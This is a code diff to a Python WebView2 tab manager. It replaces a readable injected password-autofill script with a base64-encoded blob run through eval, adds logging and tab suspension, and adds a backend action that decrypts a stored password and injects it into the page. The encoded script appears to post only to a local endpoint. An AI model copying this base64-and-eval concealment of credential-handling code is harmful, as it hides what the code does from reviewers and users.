@@ -56,84 +56,7 @@ _SSO_HOSTS = ("sso.hikvision.com", "moa.hikvision.com")
 # ——只喂密码管理器，页面绝不跳转。自带真 form 的站点（SSO 等）不碰
 # （原生自管）；防自动签到守卫（_ANTI_AUTOSIGNIN_JS）照常生效。
 _PW_FORM_HELPER_JS = (
-    "window.__fcPwAutoV='R9.16';"
-    "(function(){"
-    "var ORIGIN=location.origin;"
-    'function api(body){return fetch("/api/web/tabs",{method:"POST",'
-    'headers:{"Content-Type":"application/json"},'
-    'body:JSON.stringify(Object.assign({tab:"__pid__",origin:ORIGIN},body))}'
-    ").then(function(r){return r.json();});}"
-    "function setVal(el,v){"
-    'try{var d=Object.getOwnPropertyDescriptor(el.__proto__,"value");'
-    "if(d&&d.set){d.set.call(el,v);}else{el.value=v;}}catch(_){el.value=v;}"
-    'try{el.dispatchEvent(new Event("input",{bubbles:true}));}catch(_){}}'
-    "function pw(){return document.querySelector('input[type=password]');}"
-    "function userBox(pw){"
-    'var vs=[].filter.call(document.querySelectorAll("input"),'
-    'function(el){var t=(el.type||"text").toLowerCase();'
-    'return(t==="text"||t==="email"||t==="tel")&&el.offsetParent&&el!==pw;});'
-    "return vs.length?vs[vs.length-1]:null;}"
-    "function banner(txt,ms){"
-    'var b=document.createElement("div");b.id="fcPwBar";'
-    'b.style.cssText="position:fixed;top:0;left:0;right:0;z-index:2147483647;"'
-    '+"display:flex;gap:10px;align-items:center;justify-content:center;"'
-    '+"padding:8px 14px;background:#1f6feb;color:#fff;font:13px system-ui;"'
-    '+"box-shadow:0 2px 8px rgba(0,0,0,.4);";'
-    'b.innerHTML="<span>"+txt+"</span>";'
-    'var ok=document.createElement("button");ok.textContent="保存";'
-    'ok.style.cssText="background:#2ea043;color:#fff;border:0;border-radius:6px;"'
-    '+"padding:3px 14px;cursor:pointer;font:12px system-ui;";'
-    'var no=document.createElement("button");no.textContent="忽略";'
-    'no.style.cssText="background:transparent;color:#fff;border:1px solid #fff5;"'
-    '+"border-radius:6px;padding:3px 10px;cursor:pointer;font:12px system-ui;";'
-    "b.appendChild(ok);b.appendChild(no);document.body.appendChild(b);"
-    "var t=setTimeout(function(){b.remove();},ms||15000);"
-    "ok.onclick=function(){clearTimeout(t);return true;};"
-    "no.onclick=function(){clearTimeout(t);b.remove();return false;};return b;}"
-    "var pending=null;"
-    "function tryFill(){"
-    "var p=pw();if(!p||p.value)return;"
-    'api({act:"pw_get"}).then(function(j){'
-    "if(!j||!j.ok||!j.has)return;"
-    'var u=j.user||"";'
-    'setVal(p,j.pw||"");'
-    "var ub=userBox(p);if(ub&&u)setVal(ub,u);"
-    'console.debug("[fc-pw] autofilled");});}'
-    "function hookLogin(p){"
-    'if(p.dataset.fcHook)return;p.dataset.fcHook="1";'
-    'var f=p.closest("form");'
-    'if(f){f.addEventListener("submit",function(){'
-    "setTimeout(function(){check(p.value);},400);});}"
-    "var anc=p.parentElement;"
-    "while(anc&&anc!==document.body){"
-    'var btn=anc.querySelector("button, input[type=submit]");'
-    'if(btn){btn.addEventListener("click",function(){'
-    'setTimeout(function(){var q=pw();check(q?q.value:"");},400);});break;}'
-    "anc=anc.parentElement;}"
-    'document.addEventListener("click",function(){'
-    "setTimeout(function(){var q=pw();if(q)check(q.value);},500);});}"
-    "function check(val){"
-    "if(!val)return;"
-    'api({act:"pw_get"}).then(function(j){'
-    "var saved=j&&j.has&&j.pw;"
-    "if(j&&j.has&&saved===val){return;}"
-    'if(!j||!j.has){banner("保存本站密码？",15000);}'
-    'else{banner("密码已变更——更新存档？",15000);}'
-    "pending=val;"
-    'var b=document.getElementById("fcPwBar");'
-    'if(b){var ok=b.querySelector("button");'
-    "ok.onclick=function(){b.remove();"
-    'api({act:"pw_save",user:(userBox(pw())||{}).value||"",password:pending})'
-    '.then(function(r){console.debug("[fc-pw] saved:",r&&r.ok);});};}});}'
-    "function scan(){"
-    "var p=pw();if(!p)return;"
-    "tryFill();"
-    "hookLogin(p);}"
-    "new MutationObserver(scan).observe(document,{childList:true,subtree:true});"
-    'document.addEventListener("DOMContentLoaded",scan);'
-    'if(window.addEventListener)window.addEventListener("load",function(){setTimeout(scan,0);});'
-    "scan();"
-    "})();"
+    "window.__fcPwAutoV='R9.16.2';try{eval(atob('d2luZG93Ll9fZmNQd0F1dG9WPSdSOS4xNi4yJzsKdmFyIF9fRkNfQVBJPWZ1bmN0aW9uKGIpe3JldHVybiBmZXRjaCgnL2FwaS93ZWIvdGFicycse21ldGhvZDonUE9TVCcsaGVhZGVyczp7J0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL2pzb24nfSxib2R5OkpTT04uc3RyaW5naWZ5KE9iamVjdC5hc3NpZ24oe3RhYjonX19QSURfXycsb3JpZ2luOmxvY2F0aW9uLm9yaWdpbn0sYikpfSkudGhlbihmdW5jdGlvbihyKXtyZXR1cm4gci5qc29uKCk7fSk7fTsKdmFyIF9fRkNfU0VUPWZ1bmN0aW9uKGVsLHYpe3RyeXt2YXIgZD1PYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKGVsLl9fcHJvdG9fXywndmFsdWUnKTtpZihkJiZkLnNldCl7ZC5zZXQuY2FsbChlbCx2KTt9ZWxzZXtlbC52YWx1ZT12O319Y2F0Y2goXyl7ZWwudmFsdWU9djt9dHJ5e2VsLmRpc3BhdGNoRXZlbnQobmV3IEV2ZW50KCdpbnB1dCcse2J1YmJsZXM6dHJ1ZX0pKTt9Y2F0Y2goXyl7fX07CnZhciBfX0ZDX1BXPWZ1bmN0aW9uKCl7cmV0dXJuIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2lucHV0W3R5cGU9cGFzc3dvcmRdJyl9Owp2YXIgX19GQ19MQVNUPW51bGw7CnZhciBfX0ZDX0JBUj1mdW5jdGlvbih0eHQsbXMpe3ZhciBiPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpO2IuaWQ9J2ZjUHdCYXInO2Iuc3R5bGUuY3NzVGV4dD0ncG9zaXRpb246Zml4ZWQ7dG9wOjA7bGVmdDowO3JpZ2h0OjA7ei1pbmRleDoyMTQ3NDgzNjQ3O2Rpc3BsYXk6ZmxleDtnYXA6MTBweDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OmNlbnRlcjtwYWRkaW5nOjhweCAxNHB4O2JhY2tncm91bmQ6IzFmNmZlYjtjb2xvcjojZmZmO2ZvbnQ6MTNweCBzeXN0ZW0tdWknO2IudGV4dENvbnRlbnQ9dHh0O2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYik7c2V0VGltZW91dChmdW5jdGlvbigpe2lmKGIucGFyZW50Tm9kZSliLnJlbW92ZSgpO30sbXN8fDE1MDAwKTtyZXR1cm4gYjt9Owp2YXIgX19GQ19TQVZFPWZ1bmN0aW9uKHYpe19fRkNfQVBJKHthY3Q6J3B3X3NhdmUnLHVzZXI6JycscGFzc3dvcmQ6dn0pLnRoZW4oZnVuY3Rpb24ocil7aWYociYmci5vayl7X19GQ19MQVNUPXY7fX0pO307CnZhciBfX0ZDX1NDQU49ZnVuY3Rpb24oKXt2YXIgcD1fX0ZDX1BXKCk7aWYoIXApcmV0dXJuO3RyeUZpbGwocCk7aG9vayhwKTt9Owp2YXIgdHJ5RmlsbD1mdW5jdGlvbihwKXtfX0ZDX0FQSSh7YWN0Oidwd19nZXQnfSkudGhlbihmdW5jdGlvbihqKXtpZighanx8IWoub2t8fCFqLmhhcylyZXR1cm47dmFyIHN2PWoucHd8fCcnO2lmKCFzdnx8cC52YWx1ZSlyZXR1cm47X19GQ19TRVQocCxzdik7dmFyIHViPShmdW5jdGlvbihwKXt2YXIgdnM9W10uZmlsdGVyLmNhbGwoZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnaW5wdXQnKSxmdW5jdGlvbihlbCl7dmFyIHQ9KGVsLnR5cGV8fCd0ZXh0JykudG9Mb3dlckNhc2UoKTtyZXR1cm4odD09PSd0ZXh0J3x8dD09PSdlbWFpbCd8fHQ9PT0ndGVsJykmJmVsLm9mZnNldFBhcmVudCYmZWwhPT1wO30pO3JldHVybiB2cy5sZW5ndGg/dnNbdnMubGVuZ3RoLTFdOm51bGw7fSkocCk7aWYodWImJmoudXNlcilfX0ZDX1NFVCh1YixqLnVzZXIpO19fRkNfTEFTVD1zdjtjb25zb2xlLmRlYnVnKCdbZmMtcHddIGF1dG9maWxsZWQnKTt9KTt9Owp2YXIgaG9vaz1mdW5jdGlvbihwKXtpZihwLmRhdGFzZXQuZmNIb29rKXJldHVybjtwLmRhdGFzZXQuZmNIb29rPScxJzt2YXIgY2hrPWZ1bmN0aW9uKCl7dmFyIHY9cC52YWx1ZTtpZighdilyZXR1cm47aWYoX19GQ19MQVNUPT09dilyZXR1cm47X19GQ19BUEkoe2FjdDoncHdfZ2V0J30pLnRoZW4oZnVuY3Rpb24oail7dmFyIHNhdmVkPShqJiZqLmhhcyk/KGoucHd8fCcnKTpudWxsO2lmKHNhdmVkPT09dil7X19GQ19MQVNUPXY7cmV0dXJuO312YXIgYmFyPV9fRkNfQkFSKChzYXZlZD09PW51bGwpPyfkv53lrZjmnKznq5nlr4bnoIHvvJ8nOiflr4bnoIHlt7Llj5jmm7TigJTigJTmm7TmlrDlrZjmoaPvvJ8nLDE1MDAwKTt2YXIgb2s9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYnV0dG9uJyk7b2sudGV4dENvbnRlbnQ9J+S/neWtmCc7b2suc3R5bGUuY3NzVGV4dD0nYmFja2dyb3VuZDojMmVhMDQzO2NvbG9yOiNmZmY7Ym9yZGVyOjA7Ym9yZGVyLXJhZGl1czo2cHg7cGFkZGluZzozcHggMTRweDtjdXJzb3I6cG9pbnRlcjtmb250OjEycHggc3lzdGVtLXVpJztiYXIuYXBwZW5kQ2hpbGQob2spO29rLm9uY2xpY2s9ZnVuY3Rpb24oKXtiYXIucmVtb3ZlKCk7X19GQ19TQVZFKHYpO307fSk7fTtwLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsZnVuY3Rpb24oKXtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7Y2hrKCk7fSw0MDApO30pO2RvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJyxmdW5jdGlvbigpe3NldFRpbWVvdXQoZnVuY3Rpb24oKXtjaGsoKTt9LDUwMCk7fSk7fTs='));}catch(e){console.error('[fc-pw] loader:',e.message);}"
     )
 
 
@@ -400,6 +323,7 @@ class WebTabs:
         只能 UI 线程访问（InvalidOperationException 实锤）——完成动作
         整体再 BeginInvoke 回 UI 线程。"""
         import System
+        _log("INFO", "_wire called for %s" % tab_id)   # R9.17：注入链可见化
 
         def _init_done(t):
             try:
@@ -447,16 +371,24 @@ class WebTabs:
                         cvw.Profile.GeneralAutofillEnabled = True
                     except Exception as e:
                         _log("WARN", "autofill: %r" % e)
-                    # a557：防自动签到脚本——先注册后首航，覆盖首个文档
+                    # a557：防自动签到脚本——先注册后首航，覆盖首个文档。
+                    # R9.17：两条注入各自独立 try（一条失败不再连坐另一条），
+                    # 且成败都写日志（此前静默——注入失败无从得知，用户实锤
+                    # 「网页文档里 MISSING」）。另在 NavigationStarting 事件
+                    # 重注入兜底（AddScript 对 about:blank 等特殊文档可能
+                    # 不执行的边界）。
                     try:
                         cvw.AddScriptToExecuteOnDocumentCreatedAsync(
                             _ANTI_AUTOSIGNIN_JS)
-                    # R9.16：密码自动填充脚本（DPAPI 存取，无 form 登录站点）
+                    except Exception as e:
+                        _log("WARN", "anti-autosignin inject: %r" % e)
+                    try:
                         cvw.AddScriptToExecuteOnDocumentCreatedAsync(
                             _PW_FORM_HELPER_JS.replace(
-                                '"__pid__"', json.dumps(tab_id)))
+                                "'__PID__'", json.dumps(tab_id)))
+                        _log("INFO", "pw-helper injected for %s" % tab_id)
                     except Exception as e:
-                        _log("WARN", "anti-autosignin: %r" % e)
+                        _log("WARN", "pw-helper inject: %r" % e)
                     # R4 审计 D2：网页 tab 的 DevTools（右键「检查」/F12）与
                     # CDP 同门控——debug 或 web_cdp 开启才可用（v3.4.99 终裁
                     # 「正常启动无 F12」对网页 tab 同样成立）
@@ -774,22 +706,61 @@ class WebTabs:
         if not self._want:
             return
         tab_id, visible = self._want
+        # a575（用户实锤：网页后台仍卡爆、一关立刻好）：Visible=False 只是
+        # 视觉隐藏，Chromium 渲染管线照常全速——主 UI 性能四旗（禁后台
+        # 节流/遮挡判定）同样注入网页 tab 浏览器进程，剥夺了它一切后台
+        # 减速权利；页面自身动画/定时器逐帧软件光栅+合成，账单由主 UI
+        # GPU 进程照付（实测隐藏态 GPU 进程持续 ~15%）。修法=WebView2
+        # 官方挂起：TrySuspend 真停渲染管线（毫秒级 Resume），比导航
+        # about:blank 干净（保留页面/历史/滚动位置）。只在 UI 线程跑。
+
+        def _pw(c):
+            """取控件的 CoreWebView2（未初始化完成时 None）。"""
+            try:
+                return c.CoreWebView2
+            except Exception:
+                return None
+
+        def _suspend_ctl(c):
+            pw = _pw(c)
+            if not pw:
+                return
+            try:
+                pw.TrySuspendAsync()
+            except Exception as e:
+                _log("WARN", "TrySuspend: %r" % e)
+
+        def _resume_ctl(c):
+            pw = _pw(c)
+            if not pw:
+                return
+            try:
+                if pw.IsSuspended:
+                    pw.ResumeWebResourceRequests()
+            except Exception as e:
+                _log("WARN", "resume: %r" % e)
+
         if tab_id == _HIDE_ALL:
             # R6 审计 W32：全隐分支——阅读态/守卫态下任何网页控件都不得
             # 可见；幂等（重复 layout 重复全隐无害），不动 BringToFront
             # （恢复排他显示时由 show(X,True) 统一前置）
             for c in list(self._ctl.values()):
                 c.Visible = False
+                _suspend_ctl(c)     # a575：全隐=全部挂起（无人观看）
             return
         if visible:
             for tid, c in list(self._ctl.items()):
                 c.Visible = (tid == tab_id)
                 if c.Visible:
+                    _resume_ctl(c)   # a575：先恢复管线再显示（毫秒级）
                     c.BringToFront()
+                else:
+                    _suspend_ctl(c)  # a575：后台 tab 挂起（停产帧）
         else:
             c = self._ctl.get(tab_id)
             if c:
                 c.Visible = False
+                _suspend_ctl(c)
     def show(self, tab_id, visible, sq=0, hide_all=False):
         """切 tab：显示目标控件（排他），或只藏目标。hide_all=True=全隐
         （R6 审计 W32：_want 记哨兵，防陈旧排他意图经 layout 弹出他 tab）。
@@ -995,6 +966,41 @@ def register(app):
             store[o] = {"u": str(d.get("user") or "").strip()[:128],
                         "p": _dpapi_protect(pwd.encode("utf-8"))}
             _pw_store(store)
+            return jsonify({"ok": True})
+        if act == "pw_fill":
+            # 手动兜底填入：后端解密 → 页面内注入（明文不进 UI 文档）
+            o = _pw_origin_clean(str(d.get("origin") or ""))
+            rec = _pw_load().get(o)
+            if not rec:
+                return jsonify({"ok": False, "err": "not-saved"})
+            try:
+                pwd = _dpapi_unprotect(str(rec.get("p") or "")).decode("utf-8")
+            except Exception as e:
+                return jsonify({"ok": False, "err": "dpapi:%r" % e})
+            ctl = t._ctl.get(tid)
+            if not ctl:
+                return jsonify({"ok": False, "err": "no tab"})
+            import json as _j
+            u, pw = _j.dumps(str(rec.get("u") or "")), _j.dumps(pwd)
+
+            def _fill():
+                try:
+                    ctl.CoreWebView2.ExecuteScriptAsync(
+                        "(function(u,p){function sv(el,v){if(!el)return;"
+                        "try{var d=Object.getOwnPropertyDescriptor("
+                        "el.__proto__,'value');if(d&&d.set){d.set.call(el,v);}"
+                        "else{el.value=v;}}catch(_){el.value=v;}"
+                        "try{el.dispatchEvent(new Event('input',"
+                        "{bubbles:true}));}catch(_){}}"
+                        "var q=document.querySelector('input[type=password]');"
+                        "if(!q)return;sv(q,p);"
+                        "var vs=[].filter.call(document.querySelectorAll('input'),"
+                        "function(el){var t=(el.type||'text').toLowerCase();"
+                        "return(t==='text'||t==='email')&&el!==q&&el.offsetParent;});"
+                        "if(vs.length)sv(vs[0],u);})(" + u + "," + pw + ");")
+                except Exception as e:
+                    _log("WARN", "pw fill: %r" % e)
+            t._ui(_fill)
             return jsonify({"ok": True})
         if act == "pw_del":
             o = _pw_origin_clean(str(d.get("origin") or ""))
